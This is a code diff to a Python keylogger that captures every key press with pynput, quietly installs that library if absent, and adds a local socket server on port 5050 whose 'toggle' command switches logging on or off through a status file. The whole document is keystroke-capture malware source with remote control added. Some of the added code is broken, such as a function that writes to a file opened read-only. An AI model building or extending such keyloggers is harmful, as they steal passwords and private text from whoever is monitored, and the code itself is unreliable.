@@ -3,21 +3,25 @@ import os
 import time
 import threading
 import socket
+import sys
+
 try:
     from pynput.keyboard import Key, Listener
 except ModuleNotFoundError:
+    print("Installing pynput...")
     os.system("pip install pynput > NUL > NUL")
     from pynput.keyboard import Key, Listener
 
-# CONSTANTS
-FOLDERNAME = "temp"
 
-HEADER = 64
-PORT = 5000
-SERVER = "127.0.0.1"
-ADDR = (SERVER, PORT)
-FORMAT = "utf-8"
-DISCONNECTED_MESSAGE = "DISCONNECT"
+# CONSTANTS
+FOLDERNAME: str = "temp"
+
+HEADER: int = 64
+PORT: int = 5050
+SERVER: str = "127.0.0.1"
+ADDR: tuple[str, int] = (SERVER, PORT)
+FORMAT: str = "utf-8"
+DISCONNECTED_MESSAGE: str = "DISCONNECT"
 
 
 try:
@@ -33,11 +37,33 @@ def loggingThread():
         logging.info(str(key))
 
     with Listener(on_press=onPress) as listener:
-        listener.join()
+        status = queryStatus()
+        if status:
+            listener.join()
+        else:
+            logthread.join()
 
 
+STATUSFILE: str = "dir.txt"
+with open(STATUSFILE, "w+") as f:
+    f.write("enabled")
 
-logthread = threading.Thread(target=loggingThread)
+
+def queryStatus() -> bool:
+    with open(STATUSFILE) as f:
+        status: str = f.read()
+    if status == "enabled":
+        return True
+    else:
+        return False
+
+
+def setStatus(status: str) -> None:
+    with open(STATUSFILE) as f:
+        f.write(status)
+
+
+logthread: threading.Thread = threading.Thread(target=loggingThread)
 logthread.start()
 
 
@@ -45,14 +71,19 @@ server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(ADDR)
 
 
-def handleConnection(conn, addr):
-    connected = True
+def handleConnection(conn, addr) -> None:
+    connected: bool = True
     while connected:
-        msg_length = conn.recv(HEADER).decode(FORMAT)
+        msg_length: any = conn.recv(HEADER).decode(FORMAT)
         if msg_length:
             msg_length = int(msg_length)
-            msg = conn.recv(msg_length).decode(FORMAT)
-
+            msg: str = conn.recv(msg_length).decode(FORMAT)
+            if msg == "toggle":
+                status: bool = queryStatus()
+                if status:
+                    setStatus("disabled")
+                else:
+                    setStatus("enabled")
 
 
 def main():
